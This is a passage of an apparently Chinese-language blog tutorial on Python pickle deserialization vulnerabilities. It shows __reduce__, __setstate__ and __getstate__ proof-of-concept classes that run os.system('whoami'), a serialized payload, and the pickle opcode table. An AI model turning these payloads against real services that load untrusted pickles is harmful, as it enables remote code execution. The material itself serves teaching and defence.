class="hljs-string">&quot;whoami&quot;</span>, ))<br><br>a = Rce()<br>ser_a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(ser_a)<br>pickle.loads(ser_a)<br></code></pre></td></tr></table></figure><p>setstate：</p><p>注意：<code>__setstate__</code> 只有在<strong>反序列化对象有“状态”需要恢复时</strong>才会被调用；对于<strong>没有自定义 <code>__getstate__</code>，也没有实例属性的类</strong>，</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pf">import pickle<br>import <span class="hljs-keyword">os</span><br><br>class Rce(object):<br>def __init__(<span class="hljs-literal">self</span>, <span class="hljs-keyword">state</span>): <span class="hljs-comment"># 要有状态，随便一个变量名就行</span><br><span class="hljs-literal">self</span>.<span class="hljs-keyword">state</span> = <span class="hljs-keyword">state</span><br>def __setstate__(<span class="hljs-literal">self</span>, <span class="hljs-keyword">state</span>):<br><span class="hljs-keyword">os</span>.system(<span class="hljs-string">&quot;whoami&quot;</span>) <span class="hljs-comment"># 不能return，必须直接执行</span><br><br>a = Rce(&#x27;<span class="hljs-number">1</span>&#x27;) <span class="hljs-comment"># 有状态</span><br>ser_a = pickle.dumps(a)<br>print(ser_a)<br>pickle.loads(ser_a)<br></code></pre></td></tr></table></figure><p>getstate：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rce</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__getstate__</span>(<span class="hljs-params">self</span>):<br>os.system(<span class="hljs-string">&quot;whoami&quot;</span>) <span class="hljs-comment"># 不能return，必须直接执行</span><br><br>a = Rce()<br>ser_a= pickle.dumps(a) <span class="hljs-comment"># 序列化时就会执行</span><br><span class="hljs-built_in">print</span>(ser_a)<br></code></pre></td></tr></table></figure><p>更加尴尬的是，python并没有对pickle模块做任何安全性的限制：他没有验证反序列化的类是否在应用中注册（pickle 在反序列化时不会校验目标类是否在应用中“注册”或“允许”反序列化），也没有类似Java中SerializeUID的存在（Python pickle 没有版本ID或签名等机制来校验“这个类是否就是我想反序列化的那个类”，更没有校验数据完整性或来源可靠性）。</p><p>这也就导致了，攻击者任意构造的对象都会被实现了pickle.load的接口进行反序列化并执行Magic function。</p><p>而且，pickle 支持自定义对象如何被序列化和反序列化，关键就是 <code>__reduce__</code> 及其返回值。只要你自定义了 <code>__reduce__</code>，就可以“欺骗”pickle，让它用你指定的方式来还原对象。</p><p>大多数内建类型和新式类（继承自 <code>object</code>）都有一个默认的 <code>__reduce__</code> 实现（由基类提供）。如果你没有自定义 <code>__reduce__</code>，pickle 会调用默认的实现，pickle 会把类名、模块名、属性等一一序列化。如果你自定义了 <code>__reduce__</code>，就是重写了默认的行为，这样的话，pickle只会把你<code>__reduce__</code>返回的内容记录下来。反序列化时，pickle会执行你<code>__reduce__</code>返回的“可调用对象+参数。</p><p>这是 pickle 的最大安全隐患之一，也是 RCE（远程代码执行）攻击的常用手段。</p><p>比如我们运行如下代码</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rce</span>(<span class="hljs-keyword">object</span>):<br>name = <span class="hljs-string">&#x27;matrix&#x27;</span><br>def __reduce__(self):<br><span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&quot;whoami&quot;</span>,))<br>a = Rce()<br>print(pickle.dumps(a))<br></code></pre></td></tr></table></figure><p>结果如下：</p><p>可以发现这并没有反序列化类名、模块名、属性等，仅仅是反序列化了一个函数调用（通过system执行whoami）</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-string">b&#x27;<span class="hljs-char escape_">\x</span>80<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>95<span class="hljs-char escape_">\x</span>1e<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>02nt<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>06system<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>93<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>06whoami<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>85<span class="hljs-char escape_">\x</span>94R<span class="hljs-char escape_">\x</span>94.&#x27;</span><br></code></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs rust">import pickle<br><span class="hljs-type">str</span> = <span class="hljs-string">b&#x27;<span class="hljs-char escape_">\x</span>80<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>95<span class="hljs-char escape_">\x</span>1e<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>02nt<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>06system<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>93<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>06whoami<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>85<span class="hljs-char escape_">\x</span>94R<span class="hljs-char escape_">\x</span>94.&#x27;</span><br><br>pickle.<span class="hljs-title function_ invoke__">loads</span>(<span class="hljs-type">str</span>)<br></code></pre></td></tr></table></figure><p>然后代码执行成功。</p><p>综上，<strong>python没有对pickle模块做任何安全性的限制</strong>以及<strong>pickle 支持自定义对象如何被序列化和反序列化</strong>，我们就可以在反序列化时运行我们自定义的魔术方法，达到任意代码执行。</p><p>注意，**其他模块的load也可以触发pickle反序列化漏洞。**例如：<code>numpy.load()</code>先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞。</p><h2 id="深入pickle"><a href="#深入pickle" class="headerlink" title="深入pickle"></a>深入pickle</h2><p><strong>pickle数据流格式</strong></p><p>pickle 所使用的数据格式仅可用于 Python。这样做的好处是没有外部标准给该格式强加限制，比如 JSON 或 XDR（不能表示共享指针）标准；但这也意味着非 Python 程序可能无法重新读取 pickle 封存的 Python 对象。</p><p>默认情况下，pickle 格式使用相对紧凑的二进制来存储。如果需要让文件更小，可以高效地 压缩 由 pickle 封存的数据。</p><p>当前共有 6 种不同的协议可用于封存操作。 使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新。</p><ul><li>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python。</li><li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li>第 2 版协议是在 Python 2.3 中引入的。 它为 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-new-style-class">新式类</a> 提供了更高效的封存机制。 请参考 <a href="https://www.python.org/dev/peps/pep-0307"><strong>PEP 307</strong></a> 了解第 2 版协议带来的改进的相关信息。</li><li>v3 版协议是在 Python 3.0 中引入的。 它显式地支持 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes"><code>bytes</code></a> 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议。</li><li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。它是Python 3.8使用的默认协议。有关第 4 版协议带来改进的信息，请参阅 <a href="https://www.python.org/dev/peps/pep-3154"><strong>PEP 3154</strong></a>。</li><li>v5 版协议是在 Python 3.8 中加入的。 它增加了对带外数据的支持，并可加速带内数据处理。 请参阅 <a href="https://www.python.org/dev/peps/pep-0574"><strong>PEP 574</strong></a> 了解第 5 版协议所带来的改进的详情。</li></ul><p>注意：</p><ul><li><strong>默认协议</strong>：Python 3.8 及以上的默认协议是 v4（3.8发布时），但<strong>Python 3.8及以后新版本可能会提升默认协议</strong>，建议用 <code>pickle.DEFAULT_PROTOCOL</code> 查询。</li><li><strong>兼容性</strong>：高版本协议的 pickle 文件<strong>不能</strong>被低版本 Python 加载，反过来却通常可以。协议2是上下兼容的“最大公约数”，协议2设计时，就考虑了 py2&#x2F;py3 之间的数据交换，但协议2也不是“绝对兼容”。</li><li><strong>bytes 支持</strong>：v3 及以后支持 bytes 类型（纯二进制数据），区别于 <code>str</code>（文本字符串），v2 及以前不支持。</li></ul><p>我们用代码理解一下上面的协议：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>():<br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name=<span class="hljs-string">&#x27;matrix&#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.age = <span class="hljs-number">20</span><br><br>a = Test()<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure><p>py2 （Python 2.7.18 ）序列化后结果为：</p><p>这是协议 0（文本协议），也是 pickle 的最古老协议，内容为<strong>人类可读的文本</strong>。</p><p>（输出的一大串字符实际上是一串<code>PVM</code>操作码, 可以在<code>pickle.py</code>中看到关于这些操作码的详解，下面会讲）</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs smali">&lt;__main__.Test<span class="hljs-built_in"> instance </span>at 0x79d62a658690&gt;<br><br><br>(i__main__<br>Test<br>p0<br>(dp1<br>S&#x27;age&#x27;<br>p2<br>I20<br>sS&#x27;name&#x27;<br>p3<br>S&#x27;matrix&#x27;<br>p4<br>sb.<br></code></pre></td></tr></table></figure><p>py3 （Python 3.10.12 ）序列化后结果为：</p><p>是协议 4，内容是<strong>纯二进制字节流</strong>，不可读。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs rust">&lt;__main__.Test object at <span class="hljs-number">0x7b3e4ed90610</span>&gt;<br><br><br><span class="hljs-string">b&#x27;<span class="hljs-char escape_">\x</span>80<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>955<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>08__main__<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>04Test<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>93<span class="hljs-char escape_">\x</span>94)<span class="hljs-char escape_">\x</span>81<span class="hljs-char escape_">\x</span>94&#125;<span class="hljs-char escape_">\x</span>94(<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>04name<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>06matrix<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>03age<span class="hljs-char escape_">\x</span>94K<span class="hljs-char escape_">\x</span>14ub.&#x27;</span><br></code></pre></td></tr></table></figure><p>我们在上面“相关模块”里提到了pickle的常用方法接口，这里可以结合上面的协议进一步理解：</p><p>将打包好的对象 obj 写入文件中，其中 protocol 为 pickling 的协议版本（上面6种）。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">pickle.dump(obj, file, <span class="hljs-attribute">protocol</span>=None, *, <span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>将 obj 打包以后的对象作为 bytes 类型直接返回。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">pickle.dumps(obj, <span class="hljs-attribute">protocol</span>=None, *, <span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>从 文件 中读取二进制字节流，将其反序列化为一个对象并返回。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">pickle.load(file, *, <span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;ASCII&quot;</span>, <span class="hljs-attribute">errors</span>=<span class="hljs-string">&quot;strict&quot;</span>)<br></code></pre></td></tr></table></figure><p>从 data 中读取二进制字节流，将其反序列化为一个对象并返回。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">pickle.loads(data, *, <span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;ASCII&quot;</span>, <span class="hljs-attribute">errors</span>=<span class="hljs-string">&quot;strict&quot;</span>)<br></code></pre></td></tr></table></figure><p>但接口只是封装好之后的表象，下面我们深入理解一下</p><p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。</p><p>Pickle Virtual Machine（简称 Pickle VM 或 PVM，在安全文献或分析讨论中可能会这样叫）不是官方 Python 的一部分，而是指：Pickle 协议本身实现的解释与执行机制，即 Python 解释器在处理 pickle 字节流（即 pickle 序列化后的二进制数据）时，内部有一个“虚拟机”或“解释器”，逐条解析 pickle 指令（opcodes），并按规则恢复对象。</p><p>它和 Python 的字节码虚拟机不一样，但思想类似：都是“从一个指令流，驱动状态机，动态恢复数据结构”。</p><p>这个“虚拟机”包括一个指令集（如 MARK、STOP、REDUCE、GLOBAL、TUPLE、DICT、LIST 等），和一个堆栈模型（数据在栈上进进出出，指令操控栈内容）。</p><blockquote><ul><li><p>指令处理器</p><p>从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。最终留在栈顶的值将被作为反序列化对象返回。</p></li><li><p>stack</p><p>由 Python 的 list 实现，被用来临时存储数据、参数以及对象。</p></li><li><p>memo</p><p>由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。</p></li></ul></blockquote><p><strong>Pickle VM和 Python VM 的区别</strong></p><ul><li><strong>Python VM</strong>（通常指的是 Python Virtual Machine）负责执行 Python 字节码（pyc）。</li><li><strong>Pickle VM</strong>（非官方叫法）是指 Python 解释 pickle 数据流“指令集”和数据栈的那一套机制，只服务于 pickle 序列化与反序列化过程。</li></ul><p><strong>指令集（操作码） opcode</strong></p><p>下面是指令集（或者称操作码）所对应的二进制比特流，以及相应的解释。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">MARK</span>           = b<span class="hljs-string">&#x27;(&#x27;</span>   <span class="hljs-comment"># push special markobject on stack</span><br><span class="hljs-attr">STOP</span>           = b<span class="hljs-string">&#x27;.&#x27;</span>   <span class="hljs-comment"># every pickle ends with STOP</span><br><span class="hljs-attr">POP</span>            = b<span class="hljs-string">&#x27;0&#x27;</span>   <span class="hljs-comment"># discard topmost stack item</span><br><span class="hljs-attr">POP_MARK</span>       = b<span class="hljs-string">&#x27;1&#x27;</span>   <span class="hljs-comment"># discard stack top through topmost markobject</span><br><span class="hljs-attr">DUP</span>            = b<span class="hljs-string">&#x27;2&#x27;</span>   <span class="hljs-comment"># duplicate top stack item</span><br><span class="hljs-attr">FLOAT</span>          = b<span class="hljs-string">&#x27;F&#x27;</span>   <span class="hljs-comment"># push float object; decimal string argument</span><br><span class="hljs-attr">INT</span>            = b<span class="hljs-string">&#x27;I&#x27;</span>   <span class="hljs-comment"># push integer or bool; decimal string argument</span><br><span class="hljs-attr">BININT</span>         = b<span class="hljs-string">&#x27;J&#x27;</span>   <span class="hljs-comment"># push four-byte signed int</span><br><span class="hljs-attr">BININT1</span>        = b<span class="hljs-string">&#x27;K&#x27;</span>   <span class="hljs-comment"># push 1-byte unsigned int</span><br><span class="hljs-attr">LONG</span>           = b<span class="hljs-string">&#x27;L&#x27;</span>   <span class="hljs-comment"># push long; decimal string argument</span><br><span class="hljs-attr">BININT2</span>        = b<span class="hljs-string">&#x27;M&#x27;</span>   <span class="hljs-comment"># push 2-byte unsigned int</span><br><span class="hljs-attr">NONE</span>           = b<span class="hljs-string">&#x27;N&#x27;</span>   <span class="hljs-comment"># push None</span><br><span class="hljs-attr">PERSID</span>         = b<span class="hljs-string">&#x27;P&#x27;</span>   <span class="hljs-comment"># push persistent object; id is taken from string arg</span><br><span class="hljs-attr">BINPERSID</span>      = b<span class="hljs-string">&#x27;Q&#x27;</span>   <span class="hljs-comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br><span class="hljs-attr">REDUCE</span>         = b<span class="hljs-string">&#x27;R&#x27;</span>   <span class="hljs-comment"># apply callable to argtuple, both on stack</span><br><span class="hljs-attr">STRING</span>         = b<span class="hljs-string">&#x27;S&#x27;</span>   <span class="hljs-comment"># push string; NL-terminated string argument</span><br><span class="hljs-attr">BINSTRING</span>      = b<span class="hljs-string">&#x27;T&#x27;</span>   <span class="hljs-comment"># push string; counted binary string argument</span><br><span class="hljs-attr">SHORT_BINSTRING</span>= b<span class="hljs-string">&#x27;U&#x27;</span>   <span class="hljs-comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &amp;lt; 256 bytes</span><br><span class="hljs-attr">UNICODE</span>        = b<span class="hljs-string">&#x27;V&#x27;</span>   <span class="hljs-comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span><br><span class="hljs-attr">BINUNICODE</span>     = b<span class="hljs-string">&#x27;X&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br><span class="hljs-attr">APPEND</span>         = b<span class="hljs-string">&#x27;a&#x27;</span>   <span class="hljs-comment"># append stack top to list below it</span><br><span class="hljs-attr">BUILD</span>          = b<span class="hljs-string">&#x27;b&#x27;</span>   <span class="hljs-comment"># call __setstate__ or __dict__.update()</span><br><span class="hljs-attr">GLOBAL</span>         = b<span class="hljs-string">&#x27;c&#x27;</span>   <span class="hljs-comment"># push self.find_class(modname, name); 2 string args</span><br><span class="hljs-attr">DICT</span>           = b<span class="hljs-string">&#x27;d&#x27;</span>   <span class="hljs-comment"># build a dict from stack items</span><br><span class="hljs-attr">EMPTY_DICT</span>     = b<span class="hljs-string">&#x27;&#125;&#x27;</span>   <span class="hljs-comment"># push empty dict</span><br><span class="hljs-attr">APPENDS</span>        = b<span class="hljs-string">&#x27;e&#x27;</span>   <span class="hljs-comment"># extend list on stack by topmost stack slice</span><br><span class="hljs-attr">GET</span>            = b<span class="hljs-string">&#x27;g&#x27;</span>   <span class="hljs-comment"># push item from memo on stack; index is string arg</span><br><span class="hljs-attr">BINGET</span>         = b<span class="hljs-string">&#x27;h&#x27;</span>   <span class="hljs-comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br><span class="hljs-attr">INST</span>           = b<span class="hljs-string">&#x27;i&#x27;</span>   <span class="hljs-comment"># build &amp;amp; push class instance</span><br><span class="hljs-attr">LONG_BINGET</span>    = b<span class="hljs-string">&#x27;j&#x27;</span>   <span class="hljs-comment"># push item from memo on stack; index is 4-byte arg</span><br><span class="hljs-attr">LIST</span>           = b<span class="hljs-string">&#x27;l&#x27;</span>   <span class="hljs-comment"># build list from topmost stack items</span><br><span class="hljs-attr">EMPTY_LIST</span>     = b<span class="hljs-string">&#x27;]&#x27;</span>   <span class="hljs-comment"># push empty list</span><br><span class="hljs-attr">OBJ</span>            = b<span class="hljs-string">&#x27;o&#x27;</span>   <span class="hljs-comment"># build &amp;amp; push class instance</span><br><span class="hljs-attr">PUT</span>            = b<span class="hljs-string">&#x27;p&#x27;</span>   <span class="hljs-comment"># store stack top in memo; index is string arg</span><br><span class="hljs-attr">BINPUT</span>         = b<span class="hljs-string">&#x27;q&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br><span class="hljs-attr">LONG_BINPUT</span>    = b<span class="hljs-string">&#x27;r&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br><span class="hljs-attr">SETITEM</span>        = b<span class="hljs-string">&#x27;s&#x27;</span>   <span class="hljs-comment"># add key+value pair to dict</span><br><span class="hljs-attr">TUPLE</span>          = b<span class="hljs-string">&#x27;t&#x27;</span>   <span class="hljs-comment"># build tuple from topmost stack items</span><br><span class="hljs-attr">EMPTY_TUPLE</span>    = b<span class="hljs-string">&#x27;)&#x27;</span>   <span class="hljs-comment"># push empty tuple</span><br><span class="hljs-attr">SETITEMS</span>       = b<span class="hljs-string">&#x27;u&#x27;</span>   <span class="hljs-comment"># modify dict by adding topmost key+value pairs</span><br><span class="hljs-attr">BINFLOAT</span>       = b<span class="hljs-string">&#x27;G&#x27;</span>   <span class="hljs-comment"># push float; arg is 8-byte float encoding</span><br><br><span class="hljs-attr">TRUE</span>           = b<span class="hljs-string">&#x27;I01\n&#x27;</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span><br><span class="hljs-attr">FALSE</span>          = b<span class="hljs-string">&#x27;I00\n&#x27;</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span><br><br><span class="hljs-comment"># Protocol 2</span><br><br><span class="hljs-attr">PROTO</span>          = b<span class="hljs-string">&#x27;\x80&#x27;</span>  <span class="hljs-comment"># identify pickle protocol</span><br><span class="hljs-attr">NEWOBJ</span>         = b<span class="hljs-string">&#x27;\x81&#x27;</span>  <span class="hljs-comment"># build object by applying cls.__new__ to argtuple</span><br><span class="hljs-attr">EXT1</span>           = b<span class="hljs-string">&#x27;\x82&#x27;</span>  <span class="hljs-comment"># push object from extension registry; 1-byte index</span><br><span class="hljs-attr">EXT2</span>           = b<span class="hljs-string">&#x27;\x83&#x27;</span>  <span class="hljs-comment"># ditto, but 2-byte index</span><br><span class="hljs-attr">EXT4</span>           = b<span class="hljs-string">&#x27;\x84&#x27;</span>  <span class="hljs-comment"># ditto, but 4-byte index</span><br><span class="hljs-attr">TUPLE1</span>         = b<span class="hljs-string">&#x27;\x85&#x27;</span>  <span class="hljs-comment"># build 1-tuple from stack top</span><br><span class="hljs-attr">TUPLE2</span>         = b<span class="hljs-string">&#x27;\x86&#x27;</span>  <span class="hljs-comment"># build 2-tuple from two topmost stack items</span><br><span class="hljs-attr">TUPLE3</span>         = b<span class="hljs-string">&#x27;\x87&#x27;</span>  <span class="hljs-comment"># build 3-tuple from three topmost stack items</span><br><span class="hljs-attr">NEWTRUE</span>        = b<span class="hljs-string">&#x27;\x88&#x27;</span>  <span class="hljs-comment"># push True</span><br><span class="hljs-attr">NEWFALSE</span>       = b<span class="hljs-string">&#x27;\x89&#x27;</span>  <span class="hljs-comment"># push False</span><br><span class="hljs-attr">LONG1</span>          = b<span class="hljs-string">&#x27;\x8a&#x27;</span>  <span class="hljs-comment"># push long from &amp;lt; 256 bytes</span><br><span class="hljs-attr">LONG4</span>          = b<span class="hljs-string">&#x27;\x8b&#x27;</span>  <span class="hljs-comment"># push really big long</span><br><br><span class="hljs-attr">_tuplesize2code</span> = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]<br><br><span class="hljs-comment"># Protocol 3 (Python 3.x)</span><br><br><span class="hljs-attr">BINBYTES</span>       = b<span class="hljs-string">&#x27;B&#x27;</span>   <span class="hljs-comment"># push bytes; counted binary string argument</span><br><span class="hljs-attr">SHORT_BINBYTES</span> = b<span class="hljs-string">&#x27;C&#x27;</span>   <span class="hljs-comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &amp;lt; 256 bytes</span><br><br><span class="hljs-comment"># Protocol 4</span><br><br><span class="hljs-attr">SHORT_BINUNICODE</span> = b<span class="hljs-string">&#x27;\x8c&#x27;</span>  <span class="hljs-comment"># push short string; UTF-8 length &amp;lt; 256 bytes</span><br><span class="hljs-attr">BINUNICODE8</span>      = b<span class="hljs-string">&#x27;\x8d&#x27;</span>  <span class="hljs-comment"># push very long string</span><br><span class="hljs-attr">BINBYTES8</span>        = b<span class="hljs-string">&#x27;\x8e&#x27;</span>  <span class="hljs-comment"># push very long bytes string</span><br><span class="hljs-attr">EMPTY_SET</span>        = b<span class="hljs-string">&#x27;\x8f&#x27;</span>  <span class="hljs-comment"># push empty set on the stack</span><br><span class="hljs-attr">ADDITEMS</span>         = b<span class="hljs-string">&#x27;\x90&#x27;</span>  <span class="hljs-comment"># modify set by adding topmost stack items</span><br><span class="hljs-attr">FROZENSET</span>        = b<span class="hljs-string">&#x27;\x91&#x27;</span>  <span class="hljs-comment"># build frozenset from topmost stack items</span><br><span class="hljs-attr">NEWOBJ_EX</span>        = b<span class="hljs-string">&#x27;\x92&#x27;</span>  <span class="hljs-comment"># like NEWOBJ but work with keyword only arguments</span><br><span class="hljs-attr">STACK_GLOBAL</span>     = b<span class="hljs-string">&#x27;\x93&#x27;</span>  <span 